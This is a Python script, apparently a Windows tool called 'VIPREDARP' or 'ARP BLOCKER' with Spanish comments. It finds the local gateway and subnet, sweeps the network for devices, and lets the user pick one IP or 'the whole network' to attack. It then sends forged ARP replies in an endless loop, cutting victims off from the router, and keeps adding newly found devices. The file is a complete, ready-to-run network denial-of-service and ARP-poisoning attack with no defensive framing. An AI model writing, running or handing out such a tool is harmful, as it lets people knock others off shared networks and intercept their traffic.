#VIPREDARP

from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr, conf, IFACES
import time
import sys
import socket
import subprocess
import threading
import ipaddress

INTERVALO = 1.5

def detectar_ip_local():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        mi_ip = s.getsockname()[0]
    except Exception:
        mi_ip = "127.0.0.1"
    finally:
        s.close()
    return mi_ip

def detectar_interfaz(mi_ip):
    for k, v in IFACES.items():
        if hasattr(v, 'ip') and v.ip == mi_ip:
            return k
    return None

def detectar_gateway():
    try:
        # Usamos la tabla de ruteo nativa de Scapy (supera problemas de idiomas en Windows)
        return conf.route.route("0.0.0.0")[2]
    except Exception:
        return None

def detectar_red(mi_ip, interfaz):
    import struct
    mascara = "255.255.255.0"
    try:
        for r in conf.route.routes:
            if r[4] == mi_ip and r[2] == '0.0.0.0':
                mascara = socket.inet_ntoa(struct.pack('!I', r[1]))
                break
    except Exception:
        pass
    
    try:
        red = ipaddress.IPv4Interface(f"{mi_ip}/{mascara}").network
        return str(red)
    except Exception:
        partes = mi_ip.split(".")
        return f"{partes[0]}.{partes[1]}.{partes[2]}.0/24"


def leer_arp_windows(mi_ip, gateway):
    try:
        resultado = subprocess.check_output("arp -a", encoding="cp850", errors="ignore")
        dispositivos = []
        en_interfaz_correcta = False
        
        for linea in resultado.splitlines():
            if mi_ip in linea and "Interfaz:" in linea:
                en_interfaz_correcta = True
                continue
            
            if "Interfaz:" in linea and mi_ip not in linea:
                en_interfaz_correcta = False
            
            if not en_interfaz_correcta:
                continue
            
            partes = linea.split()
            if len(partes) >= 2:
                ip = partes[0]
                mac = partes[1].replace("-", ":")
                
                if (ip not in (gateway, mi_ip) 
                    and not ip.startswith("224.") 
                    and not ip.startswith("239.")
                    and not ip.endswith(".255") 
                    and "dinámico" in linea.lower()
                    and mac != "ff:ff:ff:ff:ff:ff"):
                    dispositivos.append({"ip": ip, "mac": mac})
                    print(f"    [+] {ip}  |  {mac}")
        
        return dispositivos
    except Exception:
        return []


def forzar_descubrimiento(rango):
    red = ipaddress.IPv4Network(rango)
    print(f"[*] Iniciando barrido en {rango} ({len(list(red.hosts()))} hosts)...")
    
    def ping(ip):
        subprocess.call(["ping", "-n", "1", "-w", "200", ip], 
                        stdout=subprocess.DEVNULL, 
                        stderr=subprocess.DEVNULL,
                        creationflags=0x08000000)

    threads = []
    hosts = list(red.hosts())
    if len(hosts) > 1024:
        print("[!] Red demasiado grande, escaneando solo los primeros 1024 hosts.")
        hosts = hosts[:1024]

    for host in hosts:
        t = threading.Thread(target=ping, args=(str(host),))
        t.start()
        threads.append(t)
        if len(threads) > 100:
            for t in threads: t.join()
            threads = []
    for t in threads: t.join()
    time.sleep(3.5)


def escanear_red(rango, interfaz, mi_ip, gateway):
    print(f"\n[*] Iniciando escaneo en {rango}...")
    
    paquete = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=rango)
    respondidos, _ = srp(paquete, iface=interfaz, timeout=4, verbose=False)

    dispositivos = []
    ips_encontradas = set()
    
    for _, resp in respondidos:
        ip  = resp[ARP].psrc
        mac = resp[ARP].hwsrc
        if ip in (gateway, mi_ip):
            continue
        dispositivos.append({"ip": ip, "mac": mac})
        ips_encontradas.add(ip)
        print(f"    [+] {ip}  |  {mac} (Scapy)")

    print("[*] Combinando con la tabla ARP de Windows...")
    dispositivos_windows = leer_arp_windows(mi_ip, gateway)
    
    for dw in dispositivos_windows:
        if dw["ip"] not in ips_encontradas:
            dispositivos.append(dw)
            ips_encontradas.add(dw["ip"])

    return dispositivos


def obtener_mac(ip, interfaz):
    for _ in range(3):
        paquete = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        resp, _ = srp(paquete, iface=interfaz, timeout=5, verbose=False)
        if resp:
            return resp[0][1].hwsrc
        time.sleep(0.5)
    
    try:
        resultado = subprocess.check_output("arp -a", encoding="cp850", errors="ignore")
        for linea in resultado.splitlines():
            if ip in linea and "dinámico" in linea.lower():
                partes = linea.split()
                if len(partes) >= 2 and partes[0] == ip:
                    return partes[1].replace("-", ":")
    except Exception:
        pass
    
    return None


def spoof(ip_objetivo, mac_objetivo, ip_suplantada, mi_mac, interfaz):
    paquete = Ether(dst=mac_objetivo) / ARP(
        op    = 2,
        pdst  = ip_objetivo,
        hwdst = mac_objetivo,
        psrc  = ip_suplantada,
        hwsrc = mi_mac
    )
    sendp(paquete, iface=interfaz, verbose=False)


def restaurar(dispositivos, gateway, mac_gateway, interfaz):
    print("\n[*] Restaurando tablas ARP...")
    for d in dispositivos:
        p1 = Ether(dst=d["mac"]) / ARP(
            op=2, pdst=d["ip"], hwdst=d["mac"],
            psrc=gateway, hwsrc=mac_gateway
        )
        p2 = Ether(dst=mac_gateway) / ARP(
            op=2, pdst=gateway, hwdst=mac_gateway,
            psrc=d["ip"], hwsrc=d["mac"]
        )
        sendp([p1, p2], iface=interfaz, count=5, verbose=False)
        print(f"    [+] Restaurado -> {d['ip']}")
    print("[*] Listo.")


def main():
    print("=" * 55)
    print("       ARP BLOCKER — Modo Automatico")
    print("=" * 55)

    mi_ip = detectar_ip_local()
    print(f"[+] Tu IP Local    : {mi_ip}")
    
    interfaz = detectar_interfaz(mi_ip)
    print(f"[+] Interfaz Activa: {interfaz}")

    gateway = detectar_gateway()
    print(f"[+] Gateway (Router): {gateway}")
    
    rango = detectar_red(mi_ip, interfaz)
    print(f"[+] Rango de Red   : {rango}")

    mi_mac = get_if_hwaddr(interfaz)

    mac_gateway = obtener_mac(gateway, interfaz)
    if not mac_gateway:
        print("[!] No se pudo obtener la MAC del Gateway. Verifica tu conexión.")
        sys.exit(1)
    print(f"[+] MAC Gateway : {mac_gateway}\n")

    print("[*] Despertando dispositivos en la red...")
    forzar_descubrimiento(rango)
    
    dispositivos_encontrados = escanear_red(rango, interfaz, mi_ip, gateway)

    print("\n" + "="*55)
    print(" [?] MODO DE ATAQUE")
    print("     Presiona ENTER para atacar a TODA LA RED.")
    print("     O escribe una IP específica (Ej: 192.168.1.15).")
    print("="*55)
    objetivo_ip = input("\n[>] Tu elección: ").strip()

    if objetivo_ip:
        dispositivos = [d for d in dispositivos_encontrados if d["ip"] == objetivo_ip]
        if not dispositivos:
            print(f"[*] La IP {objetivo_ip} no estaba en el escaneo, buscando directamente...")
            mac_obj = obtener_mac(objetivo_ip, interfaz)
            if mac_obj:
                dispositivos = [{"ip": objetivo_ip, "mac": mac_obj}]
                print(f"    [+] ¡Encontrado! {objetivo_ip} | {mac_obj}")
            else:
                print(f"[!] No se pudo encontrar la IP {objetivo_ip}. Saliendo...")
                sys.exit(1)
        else:
            print(f"[+] Atacando unicamente a la IP: {objetivo_ip}")
    else:
        dispositivos = dispositivos_encontrados
        print("[+] Modo Masivo: Atacando a TODA LA RED.")

    if not dispositivos:
        print("[!] No se encontraron otros dispositivos en la red para atacar.")
        sys.exit(0)

    print(f"\n[!] {len(dispositivos)} dispositivo(s) a bloquear")
    print("[!] Iniciando — Ctrl+C para detener y restaurar\n")

    ciclos = 0
    try:
        while True:
            # Si el modo es masivo (sin IP específica), seguimos escaneando buscando nuevos incautos
            if not objetivo_ip and ciclos % 30 == 0 and ciclos != 0:
                print("\n[*] Re-escaneando...")
                nuevos = escanear_red(rango, interfaz, mi_ip, gateway)
                ips_actuales = {d["ip"] for d in dispositivos}
                for d in nuevos:
                    if d["ip"] not in ips_actuales:
                        dispositivos.append(d)
                        print(f"    [+] Nuevo dispositivo -> {d['ip']}")

            # #VIPREDARP 3 - Bucle de Destrucción (Agujero Negro)
            for d in dispositivos:
                spoof(d["ip"],  d["mac"],   gateway, mi_mac, interfaz)
                spoof(gateway, mac_gateway, d["ip"], mi_mac, interfaz)

            ciclos += 1
            print(f"\r[*] Ciclo {ciclos} — {len(dispositivos)} bloqueado(s)", end="", flush=True)
            time.sleep(INTERVALO)

    except KeyboardInterrupt:
        restaurar(dispositivos, gateway, mac_gateway, interfaz)


if __name__ == "__main__":
    main()